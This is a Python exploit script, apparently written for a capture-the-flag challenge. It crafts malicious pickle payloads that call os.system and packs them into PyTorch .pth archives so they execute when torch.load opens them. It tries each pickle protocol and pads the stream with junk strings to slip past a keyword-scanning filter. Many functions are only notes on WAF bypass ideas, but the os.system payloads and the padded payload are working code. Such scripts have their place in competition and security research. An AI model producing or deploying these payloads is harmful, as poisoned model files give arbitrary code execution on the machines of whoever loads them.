#!/usr/bin/env python3
"""
LilacCTF Nailong2 - V25 Ultimate Bypass
=======================================

如果 WAF 扫描整个 pickle 流中的任何敏感字符串...
我们需要让敏感字符串完全不出现!

方案:
1. 用 chr() 从整数构造字符
2. 用 bytes 的索引操作
3. 用数学运算构造
"""

import pickle
import pickletools
import struct
import io
import zipfile

PROTO = b'\x80'
GLOBAL = b'c'
STACK_GLOBAL = b'\x93'
REDUCE = b'R'
MARK = b'('
TUPLE = b't'
TUPLE1 = b'\x85'
TUPLE2 = b'\x86'
TUPLE3 = b'\x87'
EMPTY_TUPLE = b')'
STOP = b'.'
SHORT_BINUNICODE = b'\x8c'
BINUNICODE = b'X'
BINGET = b'h'
BINPUT = b'q'
MEMOIZE = b'\x94'
BININT1 = b'K'
BININT2 = b'M'
SHORT_BINBYTES = b'C'
EMPTY_LIST = b']'
APPEND = b'a'
LIST = b'l'


def pack_str(s: str) -> bytes:
    encoded = s.encode('utf-8')
    if len(encoded) < 256:
        return SHORT_BINUNICODE + bytes([len(encoded)]) + encoded
    return BINUNICODE + struct.pack('<I', len(encoded)) + encoded

def pack_int(n: int) -> bytes:
    if 0 <= n < 256:
        return BININT1 + bytes([n])
    return BININT2 + struct.pack('<H', n)


def approach_chr_construction(command: str) -> bytes:
    """
    用 chr() 从 ASCII 码构造字符串
    
    ''.join([chr(111), chr(115)]) -> 'os'
    ''.join([chr(115), chr(121), chr(115), chr(116), chr(101), chr(109)]) -> 'system'
    
    需要:
    1. 获取 builtins.chr
    2. 获取 str.join 或 ''.join
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # 'builtins' 和 'chr' 还是会出现...
    # 除非我们也用 chr 构造这些!
    # 但这就是鸡生蛋问题...
    
    # ===== 方案: 用 bytes + 索引 =====
    # 创建一个包含所有需要字符的 bytes
    # 然后用索引获取
    
    # alphabet = b'abcdefghijklmnopqrstuvwxyz_'
    # alphabet[14] = 'o', alphabet[18] = 's'
    
    # 但索引操作也需要 getattr 获取 __getitem__...
    
    p.write(STOP)
    return p.getvalue()


def approach_int_math(command: str) -> bytes:
    """
    用整数运算构造 ASCII 码
    然后用 struct.pack 转成 bytes
    
    ord('o') = 111 = 100 + 11
    ord('s') = 115 = 100 + 15
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # 需要 struct.pack 或 bytes()
    # 还是需要先获取函数...
    
    p.write(STOP)
    return p.getvalue()


def approach_find_in_existing_string(command: str) -> bytes:
    """
    !!!关键洞察!!!
    
    在 Python 中有一些模块/函数的名字包含我们需要的子串:
    
    - 'copyright' 包含 'opy' (接近 'op'?)
    - 'collections' 包含 'tion'
    - 'sys' 就是 'sys'
    
    我们可以:
    1. 获取一个包含目标子串的长字符串
    2. 用切片提取
    
    但切片也需要 __getitem__...
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    p.write(STOP)
    return p.getvalue()


def approach_torch_internals(command: str) -> bytes:
    """
    利用 PyTorch 反序列化的特殊行为
    
    PyTorch torch.load 可能会:
    1. 自动导入某些模块
    2. 有特殊的 unpickler
    3. 有 weights_only 模式 (可能有漏洞)
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # PyTorch 内部使用的类:
    # - torch._utils._rebuild_tensor_v2
    # - torch.storage._TypedStorage
    # 这些类的 __reduce__ 可能有问题?
    
    p.write(STOP)
    return p.getvalue()


def approach_use_safe_modules(command: str) -> bytes:
    """
    使用绝对不会被禁的模块名
    
    例如: 'collections', 'copy', 'io', 'struct'
    
    然后通过它们的 __globals__ 或 __builtins__ 获取危险函数
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # collections.OrderedDict.__init__.__globals__
    # 但 'globals' 可能被检测...
    
    # io.BytesIO.__class__.__bases__[0].__subclasses__()
    # 但这需要很多步骤
    
    p.write(STOP)
    return p.getvalue()


def approach_double_underscore_tricks(command: str) -> bytes:
    """
    Python 对象的双下划线属性
    
    所有对象都有:
    - __class__
    - __doc__
    - __module__
    
    函数有:
    - __globals__  (被检测?)
    - __code__
    - __name__
    
    试试用别的方式写 __globals__:
    - getattr(func, '_' + '_globals_' + '_')
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # 即使这样，'globals' 子串还是存在...
    
    p.write(STOP)
    return p.getvalue()


def approach_empty_module_names():
    """
    测试: 有没有模块名不包含任何敏感关键词?
    
    安全的模块:
    - abc
    - array
    - copy  
    - csv
    - enum
    - html
    - io
    - json
    - math
    - re
    - string
    - struct
    - time
    - uuid
    - xml
    - zlib
    """
    print("\n检查安全模块中是否有 os 引用:")
    import copy
    import io as io_mod
    import json
    import math
    import struct
    import zlib
    
    modules = [copy, io_mod, json, math, struct, zlib]
    
    for mod in modules:
        for name in dir(mod):
            obj = getattr(mod, name)
            if callable(obj) and hasattr(obj, '__globals__'):
                g = obj.__globals__
                if 'os' in g:
                    print(f"  {mod.__name__}.{name}.__globals__ 有 'os'!")


def approach_no_reduce(command: str) -> bytes:
    """
    不使用 REDUCE opcode!
    
    使用 BUILD opcode 来修改对象状态
    或者使用 INST opcode
    """
    INST = b'i'
    BUILD = b'b'
    NEWOBJ = b'\x81'
    NEWOBJ_EX = b'\x92'
    
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # INST opcode: i<module>\n<name>\n
    # 创建实例并调用 __init__
    # 格式: MARK args... INST module name -> instance
    
    # 这和 GLOBAL + REDUCE 本质上一样...
    
    p.write(STOP)
    return p.getvalue()


def approach_weird_encoding(command: str) -> bytes:
    """
    使用奇怪的字符串编码
    
    Python 字符串支持:
    - UTF-8 变体
    - Unicode 正规化 (NFC, NFD, NFKC, NFKD)
    - Punycode
    
    'ｏｓ' (全角) != 'os' (半角)
    但 Python import 不认全角...
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # 这条路走不通
    
    p.write(STOP)
    return p.getvalue()


def approach_actual_solution(command: str) -> bytes:
    """
    ========================================
    实际可行的方案
    ========================================
    
    WAF 检测所有敏感字符串，但可能有盲点:
    
    1. 大小写? OS, System, SYSTEM?
       - Python 导入是大小写敏感的，不行
    
    2. 注释? 在 pickle 中添加无害数据?
       - pickle 没有注释语法
    
    3. 利用 WAF 的解析漏洞?
       - 添加垃圾数据让 WAF 解析出错
       - 使用不同的 pickle 协议
    
    4. 利用 PyTorch 特有的处理?
       - torch.load 有什么特殊逻辑?
    
    5. 文件路径 trick?
       - ../../../flag?
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # 尝试混淆 pickle 流
    # 添加大量无害数据
    for i in range(100):
        p.write(pack_str(f"safe_string_{i}"))
        p.write(MEMOIZE)
    
    # 在中间插入真正的 payload
    p.write(pack_str('os'))
    p.write(pack_str('system'))
    p.write(STACK_GLOBAL)
    p.write(pack_str(command))
    p.write(TUPLE1)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def approach_protocol_0(command: str) -> bytes:
    """
    使用 pickle 协议 0 (人类可读格式)
    可能 WAF 只检测高版本协议的 opcode?
    """
    # 协议 0 的 GLOBAL 格式不同
    # c<module>\n<name>\n
    
    # 直接用 pickle.dumps 测试
    import os
    
    class Evil:
        def __reduce__(self):
            return (os.system, (command,))
    
    # 用协议 0
    payload = pickle.dumps(Evil(), protocol=0)
    return payload


def approach_protocol_1(command: str) -> bytes:
    """协议 1"""
    import os
    class Evil:
        def __reduce__(self):
            return (os.system, (command,))
    return pickle.dumps(Evil(), protocol=1)


def approach_protocol_2(command: str) -> bytes:
    """协议 2"""
    import os
    class Evil:
        def __reduce__(self):
            return (os.system, (command,))
    return pickle.dumps(Evil(), protocol=2)


def create_pytorch_zip(pickle_payload: bytes, output_path: str):
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_STORED) as zf:
        zf.writestr('archive/version', '3')
        zf.writestr('archive/data.pkl', pickle_payload)
    with open(output_path, 'wb') as f:
        f.write(zip_buffer.getvalue())
    print(f"[+] Saved: {output_path}")


def main():
    command = "cat /flag"
    
    print("=" * 60)
    print("V25 - Ultimate Bypass Attempts")
    print("=" * 60)
    
    # 测试不同协议
    print("\n[*] Testing different pickle protocols...")
    
    for proto, func in [(0, approach_protocol_0), (1, approach_protocol_1), (2, approach_protocol_2)]:
        print(f"\n[*] Protocol {proto}:")
        try:
            payload = func(command)
            print(f"    Size: {len(payload)} bytes")
            print(f"    First 50 bytes: {payload[:50]}")
            create_pytorch_zip(payload, f"v25_proto{proto}.pth")
        except Exception as e:
            print(f"    Error: {e}")
    
    # 带垃圾数据的混淆版本
    print("\n[*] Generating obfuscated payload with junk data...")
    payload = approach_actual_solution(command)
    print(f"    Size: {len(payload)} bytes")
    create_pytorch_zip(payload, "v25_junk.pth")
    
    print("\n" + "=" * 60)
    print("测试:")
    print("1. v25_proto0.pth - 协议 0 (人类可读)")
    print("2. v25_proto1.pth - 协议 1")
    print("3. v25_proto2.pth - 协议 2")
    print("4. v25_junk.pth   - 大量垃圾数据混淆")
    print("=" * 60)
    
    # 检查哪些安全模块有 os 引用
    approach_empty_module_names()


if __name__ == "__main__":
    main()
